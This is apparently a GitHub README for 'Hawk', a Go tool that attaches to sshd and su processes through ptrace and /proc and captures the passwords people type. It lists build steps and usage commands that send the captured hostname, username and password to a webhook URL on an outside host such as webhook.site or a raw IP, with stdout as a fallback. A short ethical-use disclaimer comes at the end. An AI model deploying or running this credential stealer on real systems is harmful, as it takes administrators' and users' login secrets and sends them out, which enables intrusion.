<h1 align="center">
<br>
<img src='https://uploads-ssl.webflow.com/648e4ba94fdf34ba5288e0c3/65d950ef50097152325d639e_hawk%20small.png' height="375" border="2px solid #555">
<br>
Hawk
</h1>

Hawk is a lightweight Golang tool designed to monitor the `sshd` and `su` services for passwords on Linux systems. It reads the content of the proc directory to capture events, and ptrace to trace syscalls related to password-based authentication.

## Blog Post
https://www.prodefense.io/blog/hawks-prey-snatching-ssh-credentials

## Features

- Monitors SSH and SU commands for passwords
- Reads memory from sshd and su syscalls without writing to traced processes
- Exfiltrates passwords via HTTP or HTTPS to a specified webhook URL
- Auto-detects protocol from URL (http:// or https://)
- Stdout fallback when no webhook URL is provided

## Build

```bash
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o hawk
```

## Usage

Hawk accepts an optional webhook URL as a command-line argument. The protocol (HTTP/HTTPS) is automatically detected from the URL.

### With Webhook URL

**HTTPS Webhook:**
```bash
./hawk https://webhook.site/<GUID>
```

**HTTP Webhook:**
```bash
./hawk http://192.168.1.100:6969/webhook
```

**Auto-detection:** If no protocol is specified, HTTPS is used by default:
```bash
./hawk webhook.example.com/path
```

### Without Webhook URL (Stdout)

If no webhook URL is provided, credentials are printed to stdout:
```bash
./hawk
```

Output format:
```
hostname=xxx username=xxx password=xxx
```

### Examples

**Webhook.site Example:**
```bash
./hawk https://webhook.site/f436b722-284a-4f5f-9aa8-836677e56dcb
```

## Limitations

- Linux systems with ptrace enabled
- `/proc` filesystem must be mounted

## Disclaimer

This tool is intended for ethical and educational purposes only. Unauthorized use is prohibited. Use at your own risk.

## Credits

Hawk is inspired by the work of [blendin](https://github.com/blendin) and their tool [3snake](https://github.com/blendin/3snake).
